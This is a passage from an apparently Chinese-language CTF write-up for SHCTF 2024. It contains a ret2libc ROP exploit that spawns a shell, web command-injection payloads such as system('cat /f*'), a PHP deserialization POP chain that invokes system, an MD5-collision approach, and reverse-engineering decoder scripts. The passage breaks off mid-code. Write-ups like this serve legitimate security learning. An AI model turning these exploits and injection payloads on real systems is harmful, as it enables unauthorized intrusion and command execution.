</span></span><span style=display:flex><span>ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x040101a</span>
</span></span><span style=display:flex><span>main <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x401228</span>
</span></span><span style=display:flex><span>puts_plt <span style=color:#f92672>=</span> elf<span style=color:#f92672>.</span>plt[<span style=color:#e6db74>&#39;puts&#39;</span>]
</span></span><span style=display:flex><span>puts_got <span style=color:#f92672>=</span> elf<span style=color:#f92672>.</span>got[<span style=color:#e6db74>&#39;puts&#39;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 构造第一个payload，泄露puts地址</span>
</span></span><span style=display:flex><span>payload1 <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x108</span> <span style=color:#f92672>+</span> p64(rdi) <span style=color:#f92672>+</span> p64(puts_got) <span style=color:#f92672>+</span> p64(puts_plt) <span style=color:#f92672>+</span> p64(main)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;-1&#39;</span>)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(payload1)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 接收puts地址并计算libc基址</span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;input: &#39;</span>)
</span></span><span style=display:flex><span>puts_addr <span style=color:#f92672>=</span> u64(p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x7f</span><span style=color:#e6db74>&#39;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>6</span>:]<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>))
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;puts_addr: </span><span style=color:#e6db74>{</span>hex(puts_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>libc <span style=color:#f92672>=</span> LibcSearcher(<span style=color:#e6db74>&#39;puts&#39;</span>, puts_addr)
</span></span><span style=display:flex><span>libcbase <span style=color:#f92672>=</span> puts_addr <span style=color:#f92672>-</span> libc<span style=color:#f92672>.</span>dump(<span style=color:#e6db74>&#39;puts&#39;</span>)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;libcbase: </span><span style=color:#e6db74>{</span>hex(libcbase)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 计算system和&#34;/bin/sh&#34;地址</span>
</span></span><span style=display:flex><span>sys <span style=color:#f92672>=</span> libcbase <span style=color:#f92672>+</span> libc<span style=color:#f92672>.</span>dump(<span style=color:#e6db74>&#39;system&#39;</span>)
</span></span><span style=display:flex><span>binsh <span style=color:#f92672>=</span> libcbase <span style=color:#f92672>+</span> libc<span style=color:#f92672>.</span>dump(<span style=color:#e6db74>&#39;str_bin_sh&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 构造第二个payload，执行system(&#34;/bin/sh&#34;)</span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;-1&#34;</span>)
</span></span><span style=display:flex><span>payload2 <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x108</span> <span style=color:#f92672>+</span> p64(ret) <span style=color:#f92672>+</span> p64(rdi) <span style=color:#f92672>+</span> p64(binsh) <span style=color:#f92672>+</span> p64(sys)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(payload2)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><p><img alt=12 loading=lazy src=/posts/ctf/shctf2024/12.png></p><h2 id=web>Web</h2><h3 id=1zflask>1zflask</h3><p>先看/robots.txt,再看/s3recttt下载了文件，看一下在/api下面可以执行，进行传参得到flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>?SSHCTFF<span style=color:#f92672>=</span>cat /flag
</span></span></code></pre></div><h3 id=ez_gittt>ez_gittt</h3><p>githack坏了，用gitdump下来，然后如下操作</p><p><img alt=2 loading=lazy src=/posts/ctf/shctf2024/2.png></p><h3 id=蛐蛐蛐蛐>蛐蛐?蛐蛐!</h3><p>看源码有提示根据提示前往，然后构造payload</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>?ququ<span style=color:#f92672>=</span><span style=color:#ae81ff>0114514</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ququ<span style=color:#f92672>=</span>ququk1;system<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;cat /f*&#39;</span><span style=color:#f92672>)</span>;
</span></span></code></pre></div><h3 id=jvav>jvav</h3><p>还没学过java，问gpt跑一下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> java.io.BufferedReader;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.InputStreamReader;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>demo</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) {
</span></span><span style=display:flex><span>        String command <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;cat /flag&#34;</span>; <span style=color:#75715e>// 要执行的命令</span>
</span></span><span style=display:flex><span>        String result <span style=color:#f92672>=</span> executeCommand(command);
</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;Command output: &#34;</span> <span style=color:#f92672>+</span> result);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> String <span style=color:#a6e22e>executeCommand</span>(String command) {
</span></span><span style=display:flex><span>        StringBuilder output <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> StringBuilder();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            Process process <span style=color:#f92672>=</span> Runtime.<span style=color:#a6e22e>getRuntime</span>().<span style=color:#a6e22e>exec</span>(command);
</span></span><span style=display:flex><span>            BufferedReader reader <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> BufferedReader(<span style=color:#66d9ef>new</span> InputStreamReader(process.<span style=color:#a6e22e>getInputStream</span>()));
</span></span><span style=display:flex><span>            String line;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>while</span> ((line <span style=color:#f92672>=</span> reader.<span style=color:#a6e22e>readLine</span>()) <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
</span></span><span style=display:flex><span>                output.<span style=color:#a6e22e>append</span>(line).<span style=color:#a6e22e>append</span>(<span style=color:#e6db74>&#34;\n&#34;</span>);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            reader.<span style=color:#a6e22e>close</span>();
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (Exception e) {
</span></span><span style=display:flex><span>            e.<span style=color:#a6e22e>printStackTrace</span>();
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> output.<span style=color:#a6e22e>toString</span>().<span style=color:#a6e22e>trim</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=poppopop>poppopop</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>SH</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> $Web <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> $SHCTF <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>C</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $p;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>flag</span>()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>p</span>)();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>T</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $n;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__destruct</span>()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>SH</span><span style=color:#f92672>::</span>$Web <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>n</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>F</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $o;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__toString</span>()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>SH</span><span style=color:#f92672>::</span>$SHCTF <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>o</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>flag</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>SHCTF</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $isyou;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $flag;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__invoke</span>()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>SH</span><span style=color:#f92672>::</span>$Web) {
</span></span><span style=display:flex><span>            ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>isyou</span>)($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>flag</span>);
</span></span><span style=display:flex><span>        } 
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>$t <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>T</span>;
</span></span><span style=display:flex><span>$t<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>n</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>F</span>;
</span></span><span style=display:flex><span>$t<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>n</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>o</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>C</span>;
</span></span><span style=display:flex><span>$t<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>n</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>o</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>p</span><span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>SHCTF</span>;
</span></span><span style=display:flex><span>$t<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>n</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>o</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>p</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>isyou</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;system&#39;</span>;
</span></span><span style=display:flex><span>$t<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>n</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>o</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>p</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>flag</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;cat /f*&#39;</span>;
</span></span><span style=display:flex><span>$exp <span style=color:#f92672>=</span> <span style=color:#a6e22e>serialize</span>($t);
</span></span><span style=display:flex><span>$exp <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_encode</span>($exp);
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> $exp;
</span></span></code></pre></div><h3 id=单身十八年的手速>单身十八年的手速</h3><p>直接js定位到alert然后base64解密得到flag</p><h3 id=md5-master>MD5 Master</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__file__</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$master <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;MD5 master!&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#34;master1&#34;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#34;master2&#34;</span>])){
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>($master<span style=color:#f92672>.</span>$_POST[<span style=color:#e6db74>&#34;master1&#34;</span>] <span style=color:#f92672>!==</span> $master<span style=color:#f92672>.</span>$_POST[<span style=color:#e6db74>&#34;master2&#34;</span>] <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>md5</span>($master<span style=color:#f92672>.</span>$_POST[<span style=color:#e6db74>&#34;master1&#34;</span>]) <span style=color:#f92672>===</span> <span style=color:#a6e22e>md5</span>($master<span style=color:#f92672>.</span>$_POST[<span style=color:#e6db74>&#34;master2&#34;</span>])){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> $master <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;&lt;br&gt;&#34;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>file_get_contents</span>(<span style=color:#e6db74>&#39;/flag&#39;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;master? &lt;br&gt;&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>这题一开始的思路就是对的，只是由于编码的问题导致头一天没写出来，先用fastcoll对1.txt进行hash碰撞(内容是MD5 master!)，然后用python进行读取内容，我php写的脚本就是一直不对，不知道为什么，然后拼接就可以得到flag了，最好用bp来发，hackbar会用url的编码问题</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> urllib.parse
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>read_my_file</span>(path):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(path, <span style=color:#e6db74>&#39;rb&#39;</span>) <span style=color:#66d9ef>as</span> fh:
</span></span><span style=display:flex><span>        data <span style=color:#f92672>=</span> fh<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> data
</span></span><span style=display:flex><span><span style=color:#75715e># 指定文件路径</span>
</span></span><span style=display:flex><span>file_path <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;test_msg2.txt&#34;</span>
</span></span><span style=display:flex><span>encoded_data <span style=color:#f92672>=</span> urllib<span style=color:#f92672>.</span>parse<span style=color:#f92672>.</span>quote(read_my_file(file_path))
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;URL 编码后的内容: </span><span style=color:#e6db74>{</span>encoded_data<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span></code></pre></div><p><img alt=5 loading=lazy src=/posts/ctf/shctf2024/5.png></p><h2 id=ai>Ai</h2><h3 id=小助手>小助手</h3><p><img alt=3 loading=lazy src=/posts/ctf/shctf2024/3.png></p><h2 id=re>Re</h2><h3 id=gamegame>gamegame</h3><p>程序简单跑一下，用ida查看一下发现flag就是数独空白下来的拼接，找个在线网站填一下数独就行</p><p><img alt=10 loading=lazy src=/posts/ctf/shctf2024/10.png></p><h3 id=ezapk>ezapk</h3><p>用jeb打开定位一下，同时模拟器查看一下是什么apk</p><p><img alt=7 loading=lazy src=/posts/ctf/shctf2024/7.png></p><p>写exp</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> base64
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decode</span>(encoded_str, key):
</span></span><span style=display:flex><span>    decoded_bytes <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64decode(encoded_str)
</span></span><span style=display:flex><span>    decrypted_chars <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i, byte <span style=color:#f92672>in</span> enumerate(decoded_bytes<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)):
</span></span><span style=display:flex><span>        char_value <span style=color:#f92672>=</span> ord(byte)
</span></span><span style=display:flex><span>        char_value <span style=color:#f92672>//=</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>        char_value <span style=color:#f92672>-=</span> <span style=color:#ae81ff>6</span>
</span></span><span style=display:flex><span>        decrypted_char <span style=color:#f92672>=</span> char_value <span style=color:#f92672>^</span> key[i <span style=color:#f92672>%</span> len(key)]
</span></span><span style=display:flex><span>        decrypted_chars<span style=color:#f92672>.</span>append(chr(decrypted_char))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(decrypted_chars)
</span></span><span style=display:flex><span>key <span style=color:#f92672>=</span> [<span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>15</span>, <span style=color:#ae81ff>25</span>, <span style=color:#ae81ff>30</span>, <span style=color:#ae81ff>36</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 加密后的字符串</span>
</span></span><span style=display:flex><span>encoded_str <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;woLDgMOgw7hEwoJQw7zDtsKow7TDpMOMZMOow75QxIbDnsKmw6Z4UMK0w7rCklDCrMKqwqbDtMOOw6DDsg==&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 执行解密</span>
</span></span><span style=display:flex><span>decrypted_str <span style=color:#f92672>=</span> decode(encoded_str, key)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;Decrypted String:&#34;</span>, decrypted_str)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#39;SHCTF{&#39;</span><span style=color:#f92672>+</span>decrypted_str<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;}&#34;</span>)
</span></span></code></pre></div><p><img alt=8 loading=lazy src=/posts/ctf/shctf2024/8.png></p><h3 id=ezrc4>ezrc4</h3><p>看main函数和一些其他加密逻辑rc4解密，跑一下脚本</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> struct
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>rc4_init</span>(key):
</span></span><span style=display:flex><span>    S <span style=color:#f92672>=</span> list(range(<span style=color:#ae81ff>256</span>))
</span></span><span style=display:flex><span>    j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>256</span>):
</span></span><span style=display:flex><span>        j <span style=color:#f92672>=</span> (j <span style=color:#f92672>+</span> S[i] <span style=color:#f92672>+</span> key[i <span style=color:#f92672>%</span> len(key)]) <span style=color:#f92672>%</span> <span style=color:#ae81ff>256</span>
</span></span><span style=display:flex><span>        S[i], S[j] <span style=color:#f92672>=</span> S[j], S[i]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> S
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>rc4_decrypt</span>(data, key):
</span></span><span style=display:flex><span>    S <span style=color:#f92672>=</span> rc4_init(key)
</span></span><span style=display:flex><span>    i <span style=color:#f92672>=</span> j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    result <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> char <span style=color:#f92672>in</span> data:
</span></span><span style=display:flex><span>        i <span style=color:#f92672>=</span> (i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>%</span> <span style=color:#ae81ff>256</span>
</span></span><span style=display:flex><span>        j <span style=color:#f92672>=</span> (j <span style=color:#f92672>+</span> S[i]) <span style=color:#f92672>%</span> <span style=color:#ae81ff>256</span>
</span></span><span style=display:flex><span>        S[i], S[j] <span style=color:#f92672>=</span> S[j], S[i]
</span></span><span style=display:flex><span>        k <span style=color:#f92672>=</span> S[(S[i] <span style=color:#f92672>+</span> S[j]) <span style=color:#f92672>%</span> <span style=color:#ae81ff>256</span>]
</span></span><span style=display:flex><span>        result<span style=color:#f92672>.</span>append(char <span style=color:#f92672>^</span> k <span style=color:#f92672>^</span> <span style=color:#ae81ff>0x66</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> bytes(result)
</span></span><span style=display:flex><span><span style=color:#75715e># 从主函数中提取的加密标志</span>
</span></span><span style=display:flex><span>encrypted_flag <span style=color:#f92672>=</span> struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#39;&lt;QQQ&#39;</span>, <span style=color:#ae81ff>0x5B3C8F65423FAB21</span>, <span style=color:#ae81ff>0x691AE7846E05170C</span>, <span style=color:#ae81ff>0x111F7077C3</span>)
</span></span><span style=display:flex><span><span style=color:#75715e># 从sub_1200函数中提取的密钥</span>
</span></span><span style=display:flex><span>key <span style=color:#f92672>=</span> struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#39;&lt;Q&#39;</span>, <span style=color:#ae81ff>0x212179654B6E6546</span>)
</span></span><span style=display:flex><span><span style=color:#75715e># 解密</span>
</span></span><span style=display:flex><span>decrypted <span style=color:#f92672>=</span> rc4_decrypt(encrypted_flag, key)
</span></span><span style=display:flex><span><span style=color:#75715e># 提取有效的flag部分</span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> decrypted<span style=color:#f92672>.</span>split(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;}&#39;</span>)[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;}&#39;</span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;Flag:&#34;</span>, flag<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;ascii&#39;</span>))
</span></span></code></pre></div><h3 id=ezxor>ezxor</h3><p><img alt=11 loading=lazy src=/posts/ctf/shctf2024/11.png></p><p>按逻辑进行简单的xor就行，上exp</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;iostream&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;cstring&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> v9[<span style=color:#ae81ff>50</span>] <span style=color:#f92672>=</span> {<span style=color:#f92672>-</span><span style=color:#ae81ff>61</span>, <span style=color:#ae81ff>105</span>, <span style=color:#ae81ff>114</span>, <span style=color:#f92672>-</span><span style=color:#ae81ff>60</span>, <span style=color:#ae81ff>103</span>, <span style=color:#ae81ff>74</span>, <span style=color:#f92672>-</span><span style=color:#ae81ff>24</span>, <span style=color:#ae81ff>17</span>, <span style=color:#ae81ff>67</span>, <span style=color:#f92672>-</span><span style=color:#ae81ff>49</span>, <span style=color:#e6db74>&#39;o&#39;</span>, <span style=color:#e6db74>&#39;\0&#39;</span>, <span style=color:#f92672>-</span><span style=color:#ae81ff>13</span>, <span style=color:#ae81ff>68</span>, <span style=color:#ae81ff>110</span>, <span style=color:#f92672>-</span><span style=color:#ae81ff>8</span>, <span style=color:#ae81ff>89</span>, <span style=color:#ae81ff>73</span>, <span style=color:#f92672>-</span><span style=color:#ae81ff>24</span>, <span style=color:#ae81ff>78</span>, <span style=color:#ae81ff>94</span>, <span style=color:#f92672>-</span><span style=color:#ae81ff>30</span>, <span style=color:#ae81ff>83</span>, <span style=color:#ae81ff>67</span>, <span style=color:#f92672>-</span><span style=color:#ae81ff>79</span>, <span style=color:#ae81ff>92</span>}; <span style=color:#75715e>// flag 加密后的值
</span></span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> decrypted[<span style=color:#ae81ff>50</span>] <span style=color:#f92672>=</span> {<span style=color:#ae81ff>0</span>}; 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; j <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>50</span>; <span style=color:#f92672>++</span>j) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (j <span style=color:#f92672>%</span> <span style=color:#ae81ff>3</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>            decrypted[j] <span style=color:#f92672>=</span> v9[j] <span style=color:#f92672>^</span> <span style=color:#ae81ff>0x90</span>; 
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (j <span style=color:#f92672>%</span> <span style=color:#ae81ff>3</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>            decrypted[j] <span style=color:#f92672>=</span> v9[j] <span style=color:#f92672>^</span> <span style=color:#ae81ff>0x21</span>;
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            decrypted[j] <span style=color:#f92672>=</span> v9[j] <span style=color:#f92672>^</span> <span style=color:#ae81ff>0x31</span>; 
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Decrypted flag: &#34;</span>;
